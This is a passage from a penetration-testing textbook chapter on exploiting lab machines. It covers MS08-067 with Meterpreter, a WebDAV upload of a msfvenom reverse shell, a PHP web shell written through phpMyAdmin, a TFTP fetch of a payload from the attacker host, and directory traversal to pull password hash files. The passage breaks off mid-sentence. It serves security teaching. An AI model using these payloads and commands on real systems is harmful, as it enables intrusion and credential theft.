<html><head></head><body><section class="chapter" epub:type="chapter" id="exploitation-id00024" title="Chapter&#xA0;8.&#xA0;Exploitation"><div class="titlepage"><div><div><h2 class="title">Chapter 8. Exploitation</h2></div></div></div><p><a class="indexterm" id="iddle1363"/>After all that preparatory work we finally get to the fun stuff: exploitation. In the exploitation phase of the pentest, we run exploits against the vulnerabilities we have discovered to gain access to target systems. Some vulnerabilities, such as the use of default passwords, are so easy to exploit, it hardly feels like exploitation at all. Others are much more complicated.</p><p>In this chapter we’ll look at exploiting the vulnerabilities we identified in <a class="xref" href="ch06.xhtml" title="Chapter 6. Finding Vulnerabilities">Chapter 6</a> to gain a foothold in target machines. We’ll return to our friend MS08-067 from <a class="xref" href="ch04.xhtml" title="Chapter 4. Using the Metasploit Framework">Chapter 4</a>, now that we have more background about the vulnerability. We’ll also exploit an issue in the SLMail POP3 server with a Metasploit module. In addition, we’ll piggyback on a previous compromise and bypass login on the FTP server on our Linux target. We will exploit a vulnerability in the TikiWiki install on the Linux target and a couple of <a class="indexterm" id="iddle1111"/><a class="indexterm" id="iddle1369"/><a class="indexterm" id="iddle1757"/><a class="indexterm" id="iddle1911"/><a class="indexterm" id="iddle2075"/><a class="indexterm" id="iddle2156"/>default password issues on an XAMPP install on the Windows target. We’ll also take advantage of a readable and writable NFS share to take control of the SSH keys and log in as a valid user without knowing the password. We will interact with a fragile web server on a nonstandard port to take advantage of a directory traversal issue and download system files. For a refresher on how we discovered each of the issues we’ll use for exploitation, refer back to <a class="xref" href="ch06.xhtml" title="Chapter 6. Finding Vulnerabilities">Chapter 6</a>.</p><div class="sect1" title="Revisiting MS08-067"><div class="titlepage"><div><div><h2 class="title" id="revisiting_ms08-067" style="clear: both">Revisiting MS08-067</h2></div></div></div><p>We know from <a class="xref" href="ch06.xhtml" title="Chapter 6. Finding Vulnerabilities">Chapter 6</a> that the SMB server on our Windows XP target is missing the MS08-067 patch. The MS08-067 vulnerability has a good reputation for successful exploits, and the corresponding Metasploit module is ranked as <span class="emphasis"><em>great</em></span>. We used this vulnerability as an example in <a class="xref" href="ch04.xhtml" title="Chapter 4. Using the Metasploit Framework">Chapter 4</a>, but the knowledge we gained in the previous chapters gives us solid evidence that this exploit will result in a compromise.</p><p>When we viewed the options for the <span class="emphasis"><em>windows/smb/ms08_067_netapi</em></span> module in <a class="xref" href="ch04.xhtml" title="Chapter 4. Using the Metasploit Framework">Chapter 4</a>, we saw the usual <code class="literal">RHOST</code> and <code class="literal">RPORT</code> as well as <code class="literal">SMBPIPE</code>, which allows us to set the pipe that our exploit will use. The default is the browser pipe, though we can also use <code class="literal">SRVSRC</code>. In <a class="xref" href="ch04.xhtml" title="Chapter 4. Using the Metasploit Framework">Chapter 4</a>, we ran the Metasploit module <span class="emphasis"><em>scanner/smb/pipe_auditor</em></span> to enumerate the listening SMB pipes and found that only the browser pipe is available. Thus, we know that the default <code class="literal">SMBPIPE</code> option, <code class="literal">BROWSER</code>, is the only one that will work.</p><div class="sect2" title="Metasploit Payloads"><div class="titlepage"><div><div><h3 class="title" id="metasploit_payloads">Metasploit Payloads</h3></div></div></div><p>As we discussed in <a class="xref" href="ch04.xhtml" title="Chapter 4. Using the Metasploit Framework">Chapter 4</a>, payloads allow us to tell an exploited system to do things on our behalf. Though many payloads are either <span class="emphasis"><em>bind shells</em></span>, which listen on a local port on the target machine, or <span class="emphasis"><em>reverse shells</em></span>, which call back to a listener on the attack system, other payloads perform specific functions. For example, if you run the payload <span class="emphasis"><em>osx/armle/vibrate</em></span> on an iPhone, the phone will vibrate. There are also payloads to add a new user account: <span class="emphasis"><em>linux/x86/adduser</em></span> for Linux systems and <span class="emphasis"><em>windows/adduser</em></span> for Windows. We can download and execute a file with <span class="emphasis"><em>windows/download_exec_https</em></span> or execute a command with <span class="emphasis"><em>windows/exec</em></span>. We can even use the speech API to make the target say “Pwned” with <span class="emphasis"><em>windows/speak_pwned</em></span>.</p><p>Recall that we can see all the payloads available in Metasploit by entering <code class="literal">show payloads</code> at the root of Msfconsole. Enter this command after you tell Metasploit to use the <span class="emphasis"><em>windows/smb/ms08_067_netapi</em></span> module so you can see only payloads that are compatible with the MS08-067 exploit.</p><p>In <a class="xref" href="ch04.xhtml" title="Chapter 4. Using the Metasploit Framework">Chapter 4</a>, we used <span class="emphasis"><em>windows/shell_reverse_tcp</em></span>, but looking through the list, we also see a payload called <span class="emphasis"><em>windows/shell/reverse_tcp</em></span>.</p><a id="pro_id00105"/><pre class="programlisting">windows/shell/reverse_tcp    normal  Windows Command Shell, Reverse TCP Stager&#13;
windows/shell_reverse_tcp    normal  Windows Command Shell, Reverse TCP Inline</pre><p><a class="indexterm" id="iddle1515"/><a class="indexterm" id="iddle1709"/><a class="indexterm" id="iddle2047"/><a class="indexterm" id="iddle2244"/><a class="indexterm" id="iddle2309"/><a class="indexterm" id="iddle2315"/>Both payloads create Windows command shells using a reverse connection (discussed in <a class="xref" href="ch04.xhtml" title="Chapter 4. Using the Metasploit Framework">Chapter 4</a>). The exploited machine will connect back to our Kali machine at the IP address and port specified in the payload options. Any of the payloads listed for the <span class="emphasis"><em>windows/smb/ms08_067_netapi</em></span> will work just fine, but in different pentesting scenarios, you may have to get creative.</p><div class="sect3" title="Staged Payloads"><div class="titlepage"><div><div><h4 class="title" id="staged_payloads">Staged Payloads</h4></div></div></div><p>The <span class="emphasis"><em>windows/shell/reverse_tcp</em></span> payload is <span class="emphasis"><em>staged</em></span>. If we use it with the <span class="emphasis"><em>windows/smb/ms08_067_netapi</em></span> exploit, the string sent to the SMB server to take control of the target machine does not contain all of the instructions to create the reverse shell. Instead, it contains a <span class="emphasis"><em>stager payload</em></span> with just enough information to connect back to the attack machine and ask Metasploit for instructions on what to do next. When we launch the exploit, Metasploit sets up a handler for the <span class="emphasis"><em>windows/shell/reverse_tcp</em></span> payload to catch the incoming reverse connection and serve up the rest of the payload—in this case a reverse shell—then the completed payload is executed, and Metasploit’s handler catches the reverse shell. The amount of memory space available for a payload may be limited, and some advanced Metasploit payloads can take up a lot of space. Staged payloads allow us to use complex payloads without requiring a lot of space in memory.</p></div><div class="sect3" title="Inline Payloads"><div class="titlepage"><div><div><h4 class="title" id="inline_payloads">Inline Payloads</h4></div></div></div><p>The <span class="emphasis"><em>windows/shell_reverse_tcp</em></span> payload is an <span class="emphasis"><em>inline</em></span>, or <span class="emphasis"><em>single</em></span>, payload. Its exploit string contains all the code necessary to push a reverse shell back to the attacker machine. Though inline payloads take up more space than staged payloads, they are more stable and consistent because all the instructions are included in the original exploit string. You can distinguish inline and staged payloads by the syntax of their module name. For example, <span class="emphasis"><em>windows/shell/reverse_tcp</em></span> or <span class="emphasis"><em>windows/meterpreter/bind_tcp</em></span> are staged, whereas <span class="emphasis"><em>windows/shell_reverse_tcp</em></span> is inline.</p></div></div><div class="sect2" title="Meterpreter"><div class="titlepage"><div><div><h3 class="title" id="meterpreter">Meterpreter</h3></div></div></div><p>Meterpreter is a custom payload written for the Metasploit Project. It is loaded directly into the memory of an exploited process using a technique known as <span class="emphasis"><em>reflective dll injection</em></span>. As such, Meterpreter resides entirely in memory and writes nothing to the disk. It runs inside the memory of the host process, so it doesn’t need to start a new process that might be noticed by an intrusion prevention or intrusion detection system (IPS/IDS). Meterpreter also uses Transport Layer Security (TLS) encryption for communication between it and Metasploit. You can think of Meterpreter as a kind of shell and then some. It has additional useful commands that we can use, such as <code class="literal">hashdump</code>, which allows us to gain access to local Windows password hashes. (We’ll look at many Meterpreter commands when we study post exploitation in <a class="xref" href="ch13.xhtml" title="Chapter 13. Post Exploitation">Chapter 13</a>.)</p><p><a class="indexterm" id="iddle1158"/><a class="indexterm" id="iddle1376"/><a class="indexterm" id="iddle2447"/><a class="indexterm" id="iddle2535"/>We saw in <a class="xref" href="ch04.xhtml" title="Chapter 4. Using the Metasploit Framework">Chapter 4</a> that Metasploit’s default payload for the <span class="emphasis"><em>windows/smb/ms08_067_netapi</em></span> is <span class="emphasis"><em>windows/meterpreter/reverse_tcp</em></span>. Let’s use the <span class="emphasis"><em>windows/meterpreter/reverse_tcp</em></span> payload with our MS08-067 exploit this time. Our payload options should be familiar from other reverse payloads we have used so far. Let’s set our payload and run the exploit, as shown in <a class="xref" href="ch08.xhtml#exploiting_ms08-067_with_a_meterpreter_p" title="Example 8-1. Exploiting MS08-067 with a Meterpreter payload">Example 8-1</a>.</p><div class="example"><a id="exploiting_ms08-067_with_a_meterpreter_p"/><div class="example-title">Example 8-1. Exploiting MS08-067 with a Meterpreter payload</div><div class="example-contents"><pre class="programlisting">msf  exploit(ms08_067_netapi) &gt; <span class="strong"><strong>set payload windows/meterpreter/reverse_tcp</strong></span>&#13;
payload =&gt; windows/meterpreter/reverse_tcp&#13;
msf  exploit(ms08_067_netapi) &gt; <span class="strong"><strong>set LHOST 192.168.20.9</strong></span>&#13;
LHOST =&gt; 192.168.20.9&#13;
msf  exploit(ms08_067_netapi) &gt; <span class="strong"><strong>exploit</strong></span>&#13;
[*] Started reverse handler on 192.168.20.9:4444&#13;
[*] Automatically detecting the target...&#13;
[*] Fingerprint: Windows XP - Service Pack 3 - lang:English&#13;
[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)&#13;
[*] Attempting to trigger the vulnerability...&#13;
[*] Sending Stage to 192.168.20.10...&#13;
[*] Meterpreter session 1 opened (192.168.20.9:4444 -&gt; 192.168.20.10:4312) at 2015-01-12 00:11:58 -0500</pre></div></div><p>As the output shows, running this exploit should open a Meterpreter session that we’ll be able to use for post exploitation.</p></div></div><div class="sect1" title="Exploiting WebDAV Default Credentials"><div class="titlepage"><div><div><h2 class="title" id="exploiting_webdav_default_credentials" style="clear: both">Exploiting WebDAV Default Credentials</h2></div></div></div><p>In <a class="xref" href="ch06.xhtml" title="Chapter 6. Finding Vulnerabilities">Chapter 6</a>, we found that the XAMPP installation on our Windows XP target employs default login credentials for the WebDAV folder used to upload files to the web server. This issue allows us to upload our own pages to the server with Cadaver, a command line client for WebDAV, which we used to verify this vulnerability in <a class="xref" href="ch06.xhtml" title="Chapter 6. Finding Vulnerabilities">Chapter 6</a>. Let’s create a simple test file to upload:</p><a id="pro_id00106"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>cat test.txt</strong></span>&#13;
test</pre><p>Now use Cadaver with the credentials <span class="emphasis"><em>wampp:xampp</em></span> to authenticate with WebDAV.</p><a id="pro_id00107"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>cadaver http://192.168.20.10/webdav</strong></span>&#13;
Authentication required for XAMPP with WebDAV on server `192.168.20.10':&#13;
Username: <span class="strong"><strong>wampp</strong></span>&#13;
Password:&#13;
dav:/webdav/&gt;</pre><p>Finally, use WebDAV’s <code class="literal">put</code> command to upload our <span class="emphasis"><em>test.txt</em></span> file to the web server.</p><a id="pro_id00108"/><pre class="programlisting">dav:/webdav/&gt; <span class="strong"><strong>put test.txt</strong></span>&#13;
Uploading test.txt to `/webdav/test.txt':&#13;
Progress: [=============================&gt;] 100.0% of 5 bytes succeeded.&#13;
dav:/webdav/&gt;</pre><p><a class="indexterm" id="iddle1780"/><a class="indexterm" id="iddle2111"/><a class="indexterm" id="iddle2331"/><a class="indexterm" id="iddle2444"/>If you browse to <span class="emphasis"><em>/webdav/test.txt</em></span>, you should see that we have successfully uploaded our text file to the website, as shown in <a class="xref" href="ch08.xhtml#file_uploaded_with_webdav" title="Figure 8-1. A file uploaded with WebDAV">Figure 8-1</a>.</p><div class="figure"><a id="file_uploaded_with_webdav"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00098"/><img alt="A file uploaded with WebDAV" src="httpatomoreillycomsourcenostarchimages2030386.png.jpg"/></div></div><div class="figure-title">Figure 8-1. A file uploaded with WebDAV</div></div><div class="sect2" title="Running a Script on the Target Web Server"><div class="titlepage"><div><div><h3 class="title" id="running_a_script_on_the_target_web_serve">Running a Script on the Target Web Server</h3></div></div></div><p>A text file is not very useful to us; it would be better if we could upload a script and execute it on the web server, allowing us to run commands on the underlying system’s Apache web server. If Apache is installed as a system service, it will have system-level privileges, which we could use to gain maximum control over our target. If not, Apache will run with privileges of the user who started it. Either way, you should end up with a good deal of control over the underlying system just by dropping a file on the web server.</p><p>Let’s start by confirming that our WebDAV user is allowed to upload scripts to the server. Because we found phpMyAdmin software on this web server in <a class="xref" href="ch06.xhtml" title="Chapter 6. Finding Vulnerabilities">Chapter 6</a>, we know that the XAMPP software includes PHP. If we upload and execute a PHP file, we should be able to run commands on the system using PHP.</p><a id="pro_id00109"/><pre class="programlisting">dav:/webdav/&gt; <span class="strong"><strong>put test.php</strong></span>&#13;
Uploading test.php to `/webdav/test.php':&#13;
Progress: [=============================&gt;] 100.0% of 5 bytes succeeded.&#13;
dav:/webdav/&gt;</pre><div class="note" title="Note"><h3 class="title"><a id="ch08note01"/>Note</h3><p>Some open WebDAV servers allow uploading text files but block script files like .asp or .php. Lucky for us, that isn’t the case here, and we successfully uploaded test.php.</p></div></div><div class="sect2" title="Uploading a Msfvenom Payload"><div class="titlepage"><div><div><h3 class="title" id="uploading_a_msfvenom_payload">Uploading a Msfvenom Payload</h3></div></div></div><p>In addition to uploading any PHP scripts we’ve created to perform tasks on the target, we can also use Msfvenom to generate a stand-alone Metasploit payload to upload to the server. We used Msfvenom briefly in <a class="xref" href="ch04.xhtml" title="Chapter 4. Using the Metasploit Framework">Chapter 4</a>, but to brush up on syntax, you can enter <code class="literal">msfvenom -h</code> for help. When you’re ready, list all the available payloads with the <code class="literal">-l</code> option for PHP payloads, as shown in <a class="xref" href="ch08.xhtml#metasploit_php_payloads" title="Example 8-2. Metasploit PHP payloads">Example 8-2</a>.</p><div class="example"><a id="metasploit_php_payloads"/><div class="example-title">Example 8-2. Metasploit PHP payloads</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>msfvenom -l payloads</strong></span>&#13;
&#13;
    php/bind_perl❶               Listen for a connection and spawn a command&#13;
                                    shell via perl (persistent)&#13;
    php/bind_perl_ipv6            Listen for a connection and spawn a command&#13;
                                    shell via perl (persistent) over IPv6&#13;
    php/bind_php                  Listen for a connection and spawn a command&#13;
                                    shell via php&#13;
    php/bind_php_ipv6             Listen for a connection and spawn a command&#13;
                                    shell via php (IPv6)&#13;
    php/download_exec❷           Download an EXE from an HTTP URL and execute it&#13;
    php/exec                      Execute a single system command&#13;
    php/meterpreter/bind_tcp❸    Listen for a connection over IPv6, Run a&#13;
                                    meterpreter server in PHP&#13;
    php/meterpreter/reverse_tcp   Reverse PHP connect back stager with checks&#13;
                                    for disabled functions, Run a meterpreter&#13;
                                    server in PHP&#13;
    php/meterpreter_reverse_tcp   Connect back to attacker and spawn a&#13;
                                    Meterpreter server (PHP)&#13;
    php/reverse_perl              Creates an interactive shell via perl&#13;
    php/reverse_php               Reverse PHP connect back shell with checks&#13;
                                    for disabled functions&#13;
    php/shell_findsock</pre></div></div><p><a class="indexterm" id="iddle1613"/>Msfvenom gives us a few options: We can download and execute a file on the system ❷, create a shell ❶, or even use Meterpreter ❸. Any of these payloads will give us control of the system, but let’s use <span class="emphasis"><em>php/meterpreter/reverse_tcp</em></span>. After we specify a payload, we can use <code class="literal">-o</code> to find out which options we need to use with it, as shown here.</p><a id="pro_id00110"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>msfvenom -p php/meterpreter/reverse_tcp -o</strong></span>&#13;
[*] Options for payload/php/meterpreter/reverse_tcp&#13;
&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
    Name   Current Setting  Required  Description&#13;
    ----   ---------------  --------  -----------&#13;
    LHOST                   yes       The listen address&#13;
    LPORT  4444             yes       The listen port</pre><p>As you can see we need to set <code class="literal">LHOST</code> to tell the payload which IP address to connect back to, and we can also change the <code class="literal">LPORT</code> option. Because this payload is already in PHP format, we can output it in the raw format with the <code class="literal">-f</code> option after we set our options, and then pipe the raw PHP code into a file with the <span class="emphasis"><em>.php</em></span> extension for posting to the server, as shown here.</p><a id="pro_id00111"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2323 -f raw &gt; meterpreter.php</strong></span></pre><p><a class="indexterm" id="iddle1441"/><a class="indexterm" id="iddle1763"/><a class="indexterm" id="iddle2445"/>Now we upload the file using WebDAV.</p><a id="pro_id00112"/><pre class="programlisting">dav:/webdav/&gt; <span class="strong"><strong>put meterpreter.php</strong></span>&#13;
Uploading meterpreter.php to `/webdav/meterpreter.php':&#13;
Progress: [=============================&gt;] 100.0% of 1317 bytes succeeded.</pre><p>As in <a class="xref" href="ch04.xhtml" title="Chapter 4. Using the Metasploit Framework">Chapter 4</a>, we need to set up a handler in Msfconsole to catch the payload before we execute the script (see <a class="xref" href="ch08.xhtml#setting_up_the_payload_handler" title="Example 8-3. Setting up the payload handler">Example 8-3</a>).</p><div class="example"><a id="setting_up_the_payload_handler"/><div class="example-title">Example 8-3. Setting up the payload handler</div><div class="example-contents"><pre class="programlisting">msf &gt; <span class="strong"><strong>use multi/handler</strong></span>&#13;
msf  exploit(handler) &gt; <span class="strong"><strong>set payload php/meterpreter/reverse_tcp</strong></span>❶&#13;
payload =&gt; php/meterpreter/reverse_tcp&#13;
msf  exploit(handler) &gt; <span class="strong"><strong>set LHOST 192.168.20.9</strong></span>❷&#13;
lhost =&gt; 192.168.20.9&#13;
msf  exploit(handler) &gt; <span class="strong"><strong>set LPORT 2323</strong></span>❸&#13;
lport =&gt; 2323&#13;
msf  exploit(handler) &gt; <span class="strong"><strong>exploit</strong></span>&#13;
[*] Started reverse handler on 192.168.20.9:2323&#13;
[*] Starting the payload handler...</pre></div></div><p>Use <span class="emphasis"><em>multi/handler</em></span> in Msfconsole, set the payload to <span class="emphasis"><em>php/meterpreter/reverse_tcp</em></span> ❶, and set <code class="literal">LHOST</code> ❷ and <code class="literal">LPORT</code> ❸ appropriately to match the generated payload. If this process is unfamiliar to you, jump back to the <a class="xref" href="ch04.xhtml#creating_standalone_payloads_with_msfven" title="Creating Standalone Payloads with Msfvenom">Creating Standalone Payloads with Msfvenom</a>.</p><p>Running the uploaded payload by opening it in a web browser should provide us with a Meterpreter session that we can see when we return to Msfconsole, as shown here.</p><a id="pro_id00113"/><pre class="programlisting">[*] Sending stage (39217 bytes) to 192.168.20.10&#13;
[*] Meterpreter session 2 opened (192.168.20.9:2323 -&gt; 192.168.20.10:1301) at 2015-01-07 17:27:44 -0500&#13;
&#13;
meterpreter &gt;</pre><p>We can use the Meterpreter command <code class="literal">getuid</code> to see what privileges our session has on the exploited target. Generally speaking, we get the privileges of the software we exploited.</p><a id="pro_id00114"/><pre class="programlisting">meterpreter &gt; <span class="strong"><strong>getuid</strong></span>&#13;
BOOKXP\SYSTEM</pre><p>We now have system privileges, which will allow us to take complete control of the Windows system. (It’s generally a bad idea to allow web server software to have system privileges for just this reason. Because XAMPP’s Apache server is running as a system service, we have full access to the underlying system.)</p><p>Now let’s look at another issue with our XAMPP install.</p></div></div><div class="sect1" title="Exploiting Open phpMyAdmin"><div class="titlepage"><div><div><h2 class="title" id="exploiting_open_phpmyadmin" style="clear: both">Exploiting Open phpMyAdmin</h2></div></div></div><p><a class="indexterm" id="iddle1007"/><a class="indexterm" id="iddle1288"/><a class="indexterm" id="iddle1335"/><a class="indexterm" id="iddle1373"/><a class="indexterm" id="iddle1789"/><a class="indexterm" id="iddle1935"/><a class="indexterm" id="iddle2211"/><a class="indexterm" id="iddle2275"/><a class="indexterm" id="iddle2532"/>The same target XAMPP platform exploited in the previous section also includes an open phpMyAdmin install, which we can exploit to run commands on the database server. Like Apache, our MySQL server will have either system privileges (if it is installed as a Windows service) or the privileges of the user that started the MySQL process. By accessing the MySQL database, we can perform an attack similar to our WebDAV attack and upload scripts to the web server using MySQL queries.</p><p>To explore this attack, first navigate to <span class="emphasis"><em><a class="ulink" href="http://192.168.20.10/phpmyadmin" target="_top">http://192.168.20.10/phpmyadmin</a></em></span>, and click the SQL tab at the top. We’ll use MySQL to write a script to the web server that we’ll use to get a remote shell. We’ll use a SQL <code class="literal">SELECT</code> statement to output a PHP script to a file on the web server, which will allow us to remotely control the target system. We’ll use the script <code class="literal">&lt;?php system($_GET['cmd']); ?&gt;</code> to grab the <code class="literal">cmd</code> parameter from the URL and execute it using the <code class="literal">system()</code> command.</p><p>The default install location for XAMPP’s Apache on Windows is <span class="emphasis"><em>C:\xampp\htodcs\</em></span>. The syntax for our command is: <code class="literal">SELECT "</code><span class="emphasis"><em><code class="literal">&lt;script string&gt;</code></em></span><code class="literal">"</code> <code class="literal">into outfile "</code><span class="emphasis"><em><code class="literal">path_to_file_on_web_server</code></em></span><code class="literal">"</code>. Our completed command looks like this:</p><a id="pro_id00115"/><pre class="programlisting">SELECT "&lt;?php system($_GET['cmd']); ?&gt;" into outfile "C:\\xampp\\htdocs\\shell.php"</pre><div class="note" title="Note"><h3 class="title"><a id="ch08note02"/>Note</h3><p>We use double backslashes to escape, so we don’t end up with the file C:xampphtdocsshell.php, which we will not be able to access from the web server.</p></div><p><a class="xref" href="ch08.xhtml#executing_sql_commands" title="Figure 8-2. Executing SQL commands">Figure 8-2</a> shows the command entered into the SQL console in phpMyAdmin.</p><div class="figure"><a id="executing_sql_commands"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00099"/><img alt="Executing SQL commands" src="httpatomoreillycomsourcenostarchimages2030388.png.jpg"/></div></div><div class="figure-title">Figure 8-2. Executing SQL commands</div></div><p><a class="indexterm" id="iddle1080"/><a class="indexterm" id="iddle1295"/><a class="indexterm" id="iddle2295"/><a class="indexterm" id="iddle2316"/><a class="indexterm" id="iddle2425"/>Run the completed query in phpMyAdmin, and then browse to the newly created file, <span class="emphasis"><em><a class="ulink" href="http://192.168.20.10/shell.php" target="_top">http://192.168.20.10/shell.php</a></em></span>. The script should throw the error <span class="emphasis"><em>Warning: system() [function.system]: Cannot execute a blank command in C:\xampp\htdocs\shell.php on line 1</em></span>, because we did not supply an <code class="literal">cmd</code> parameter. (Recall from earlier that <span class="emphasis"><em>shell.php</em></span> grabs the <code class="literal">cmd</code> parameter from the URL and runs it using the PHP <code class="literal">system()</code> command.) We need to supply a <code class="literal">cmd</code> parameter that tells the script the command we’d like to run on the target system. For example, we can ask the Windows XP target to tell us its networking information using <code class="literal">ipconfig</code> as the <code class="literal">cmd</code> parameter, like so:</p><a id="pro_id00116"/><pre class="programlisting">http://192.168.20.10/shell.php?cmd=ipconfig</pre><p>The result is shown in <a class="xref" href="ch08.xhtml#code_execution" title="Figure 8-3. Code execution">Figure 8-3</a>.</p><div class="figure"><a id="code_execution"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00100"/><img alt="Code execution" src="httpatomoreillycomsourcenostarchimages2030390.png.jpg"/></div></div><div class="figure-title">Figure 8-3. Code execution</div></div><div class="sect2" title="Downloading a File with TFTP"><div class="titlepage"><div><div><h3 class="title" id="downloading_a_file_with_tftp">Downloading a File with TFTP</h3></div></div></div><p>The previous steps give us a shell with system privileges, which we “upgrade” by uploading a more complicated PHP script. But rather than creating a really long and complicated SQL <code class="literal">SELECT</code> query, we can host a file on our Kali machine and then use our PHP shell to pull it down to the web server. On Linux, we could use <code class="literal">wget</code> to download files from the command line. This functionality is painfully absent on Windows, but we can use TFTP on Windows XP. Let’s use it to upload <span class="emphasis"><em>meterpreter.php</em></span> from the previous section.</p><div class="note" title="Note"><h3 class="title"><a id="ch08note03"/>Note</h3><p>TFTP is not the only way we can transfer files with noninteractive command line access. In fact, some newer Windows systems do not have TFTP enabled by default. You can also have FTP read settings from a file with the <code class="literal">-s</code> option or use a scripting language such as Visual Basic or Powershell on the latest Windows operating systems.</p></div><p>We can use the Atftpd TFTP server to host files on our Kali system. Start Atftpd in daemon mode, serving files from the location of your <span class="emphasis"><em>meterpreter.php</em></span> script.</p><a id="pro_id00117"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>atftpd --daemon --bind-address 192.168.20.9 /tmp</strong></span></pre><p>Set the <code class="literal">cmd</code> parameter in the <span class="emphasis"><em>shell.php</em></span> script as follows:</p><a id="pro_id00118"/><pre class="programlisting">http://192.168.20.10/shell.php?cmd=tftp 192.168.20.9 get meterpreter.php&#13;
C:\\xampp\\htdocs\\meterpreter.php</pre><p><a class="indexterm" id="iddle1201"/><a class="indexterm" id="iddle1248"/><a class="indexterm" id="iddle1292"/><a class="indexterm" id="iddle1404"/><a class="indexterm" id="iddle1901"/><a class="indexterm" id="iddle2131"/><a class="indexterm" id="iddle2542"/>This command should pull down <span class="emphasis"><em>meterpreter.php</em></span> to the target’s Apache directory using TFTP, as shown in <a class="xref" href="ch08.xhtml#transferring_files_with_tftp" title="Figure 8-4. Transferring files with TFTP">Figure 8-4</a>.</p><div class="figure"><a id="transferring_files_with_tftp"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00101"/><img alt="Transferring files with TFTP" src="httpatomoreillycomsourcenostarchimages2030392.png"/></div></div><div class="figure-title">Figure 8-4. Transferring files with TFTP</div></div><p>Now we can browse to <span class="emphasis"><em><a class="ulink" href="http://192.168.20.10/meterpreter.php" target="_top">http://192.168.20.10/meterpreter.php</a></em></span> to open a Meterpreter shell. (Be sure to restart the handler to catch the Meterpreter connection before executing the script.) And as you can see, though we used an attack different from uploading a file through WebDAV, we ended up in the same place: We have a Meterpreter shell from the web server using its access to the MySQL server to upload files.</p><p>Now let’s look at attacking the other web server on the Windows XP system.</p><div class="note" title="Note"><h3 class="title"><a id="ch08note04"/>Note</h3><p>This is not the only way we could exploit database access. For example, if you find a Microsoft MS SQL database instead, you may be able to use the <code class="literal">xp_cmdshell()</code> function, which acts as a built-in system command shell. For security reasons, it is disabled on newer versions of MS SQL, but a user with administrative privileges should be able to reenable it, giving you shell access without having to upload anything.</p></div></div></div><div class="sect1" title="Downloading Sensitive Files"><div class="titlepage"><div><div><h2 class="title" id="downloading_sensitive_files" style="clear: both">Downloading Sensitive Files</h2></div></div></div><p>Recall from <a class="xref" href="ch06.xhtml" title="Chapter 6. Finding Vulnerabilities">Chapter 6</a> that our Zervit server on port 3232 has a directory traversal issue that will allow us to download files from the remote system without authentication. We can download the Windows <span class="emphasis"><em>boot.ini</em></span> configuration file (and other files, too) through the browser with the following URL:</p><a id="pro_id00119"/><pre class="programlisting">http://192.168.20.10:3232/index.html?../../../../../../boot.ini</pre><p>We’ll use this ability to pull files containing password hashes (encrypted passwords) for Windows, as well as installed services.</p><div class="sect2" title="Downloading a Configuration File"><div class="titlepage"><div><div><h3 class="title" id="downloading_a_configuration_file">Downloading a Configuration File</h3></div></div></div><p>The default install location for XAMPP is <span class="emphasis"><em>C:\xampp</em></span>, so we can expect the directory for FileZilla FTP server to be at <span class="emphasis"><em>C:\xampp\FileZillaFtp</em></span>. A little online research on FileZilla tells us that it stores MD5 hashes of passwords in the <span class="emphasis"><em>FileZilla Server.xml</em></span> configuration file. Depending on the strength of the FTP passwords stored in this file, we may be able to use the MD5 hash value to recover users’ plaintext FTP passwords.</p><p>We captured the password for user <span class="emphasis"><em>georgia</em></span> in <a class="xref" href="ch07.xhtml" title="Chapter 7. Capturing Traffic">Chapter 7</a>, but our target may contain additional accounts. Let’s use the Zervit server to download the FileZilla configuration file from <span class="emphasis"><em><a class="ulink" href="http://192.168.20.10:3232/index.html?../../../../../../xampp/FileZillaFtp/FileZilla%20Server.xml" target="_top">http://192.168.20.10:3232/index.html?../../../../../../xampp/FileZillaFtp/FileZilla%20Server.xml</a></em></span>. (Note that %20 is <a class="indexterm" id="iddle1119"/><a class="indexterm" id="iddle1297"/><a class="indexterm" id="iddle1330"/><a class="indexterm" id="iddle2097"/><a class="indexterm" id="iddle2118"/><a class="indexterm" id="iddle2273"/><a class="indexterm" id="iddle2466"/><a class="indexterm" id="iddle2469"/>hex encoding for a space.) You can see some of the contents of the file in <a class="xref" href="ch08.xhtml#filezilla_ftp_configuration_file" title="Example 8-4. FileZilla FTP configuration file">Example 8-4</a>.</p><div class="example"><a id="filezilla_ftp_configuration_file"/><div class="example-title">Example 8-4. FileZilla FTP configuration file</div><div class="example-contents"><pre class="programlisting">&lt;User Name="georgia"&gt;&#13;
&lt;Option Name="Pass"&gt;5f4dcc3b5aa765d61d8327deb882cf99&lt;/Option&gt;&#13;
&lt;Option Name="Group"/&gt;&#13;
&lt;Option Name="Bypass server userlimit"&gt;0&lt;/Option&gt;&#13;
&lt;Option Name="User Limit"&gt;0&lt;/Option&gt;&#13;
&lt;Option Name="IP Limit"&gt;0&lt;/Option&gt;&#13;
--<span class="emphasis"><em>snip</em></span>--</pre></div></div><p>As you can see, the configuration file contains two user accounts (in the User Name fields): <span class="emphasis"><em>georgia</em></span> and <span class="emphasis"><em>newuser</em></span>. Now all we have to do is figure out their passwords based on the stored hashes.</p><p>We’ll look at turning password hashes back into plaintext passwords (including MD5 hashes) in the next chapter.</p></div><div class="sect2" title="Downloading the Windows SAM"><div class="titlepage"><div><div><h3 class="title" id="downloading_the_windows_sam">Downloading the Windows SAM</h3></div></div></div><p>Speaking of passwords, in addition to the FTP user passwords, we can try pulling down the <span class="emphasis"><em>Windows Security Accounts Manager (SAM)</em></span> file that stores Windows hashes. The SAM file is obfuscated because the Windows Syskey utility encrypts the password hashes inside the SAM file with 128-bit Rivest Cipher 4 (RC4) to provide additional security. Even if an attacker or pentester is able to gain access to the SAM file, there is a bit more work to do to recover the password hashes. We need a key to reverse the RC4 encryption on the hashes. The encryption key for the Syskey utility, called the <span class="emphasis"><em>bootkey</em></span>, is stored inside of the Windows SYSTEM file. We need to download both the SAM and SYSTEM files to recover the hashes and attempt to reverse them into plaintext passwords. In Windows XP, these files are located at <span class="emphasis"><em>C:\Windows\System32\config</em></span>, so let’s try downloading the SAM file from the 